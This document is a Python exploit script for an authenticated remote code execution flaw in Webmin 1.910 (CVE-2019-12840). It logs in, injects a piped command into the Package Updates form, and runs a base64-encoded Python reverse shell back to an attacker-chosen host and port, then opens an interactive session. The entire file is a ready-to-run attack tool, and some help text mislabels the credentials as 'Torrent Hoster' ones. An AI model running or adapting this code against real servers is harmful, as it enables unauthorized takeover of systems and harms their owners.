# -*- coding: utf-8 -*-

# Webmin 1.910 Authenticated RCE
# CVE: 2019-12840
# Exploit author: AkkuS <Özkan Mustafa Akkuş>
# https://www.exploit-db.com/exploits/46984
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import requests
import sys
from pwn import *
from urllib3.exceptions import InsecureRequestWarning


def main():

    # args
    argparser = argparse.ArgumentParser(description='Webmin 1.910 Authenticated RCE', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Webmin host', 
                            required=True)
    
    main_arg.add_argument('--rport', type=str,
                            help='Webmin host port', 
                            required=False, default='10000')
                            
    main_arg.add_argument('--username', type=str,
                            help='Torrent Hoster username', 
                            required=True)
    
    main_arg.add_argument('--password', type=str,
                            help='Torrent Hoster password', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    rport = args.rport
    username = args.username
    password = args.password
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # session
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    sess = requests.Session()
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
    
    
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""whoami""")
        l.interactive()
    
    def login():
        
        params = {
            "page": "",
            "user": username,
            "pass": password
        }
        
        cookies = { "testing": "1" }
        
        print(" [*] Login using the provided credentials...")
        
        try:
        
            if burpsuite:
                r = sess.post("https://{}:{}/session_login.cgi".format(rhost, rport), 
                                                                cookies=cookies,
                                                                params=params, 
                                                                verify=False, 
                                                                proxies=proxies)
            
            else:
                r = sess.post("https://{}:{}/session_login.cgi".format(rhost, rport),
                                                                cookies=cookies, 
                                                                data=params, 
                                                                verify=False)
                                                                
        except Exception as e:
            print(e)
            print(" [*] Failed to login due an error.")
            sys.exit(1)
        
        else:
            if 'session_login.cgi' not in r.url:
                print(" [*] Login successfully!")
                
                return True
            
            else:
                print(" [*] Failed to login, check your credentials.")
                
                return False
    
    def exploit():
        
        py_payload = "python -c 'import socket,subprocess,os;"
        py_payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        py_payload += "s.connect((\"{}\",{}));".format(lhost, lport)
        py_payload += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        py_payload += "p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        py_payload_encoded = base64.b64encode(bytes(py_payload.encode())).decode()
        payload = 'bash -c \'echo "{}" | base64 -d | bash\''.format(py_payload_encoded)
        
        data_body = "u=&u=%20%7C%20{}&ok_top=Update+Selected+Packages".format(payload)
        
        headers = {
            "Referer": "https://{}:{}/package-updates/?xnavigation=1".format(rhost, rport)
        }
        
        print(" [*] Exploiting the 'Package Updates' flaw...")
        
        l = listen(lport)
        
        try:
            if burpsuite:
                r = sess.post("https://{}:{}/package-updates/update.cgi".format(rhost, rport), 
                                                                            data=data_body,
                                                                            headers=headers,
                                                                            verify=False,
                                                                            proxies=proxies,
                                                                            timeout=3)
            
            else:
                r = sess.post("https://{}:{}/package-updates/update.cgi".format(rhost, rport), 
                                                                            data=data_body,
                                                                            headers=headers,
                                                                            verify=False, 
                                                                            timeout=3)
        
        except:
            print(" [*] Webmin 1.910 exploited with success!")
            reverse_shell(l)            
    
    
    # main 
    print(" [>] Webmin 1.910 Authenticated RCE")
    print(" [*] Python script exploit author: nullarmor")
          
    if login():
        exploit()                 

if __name__ == "__main__":
    main()

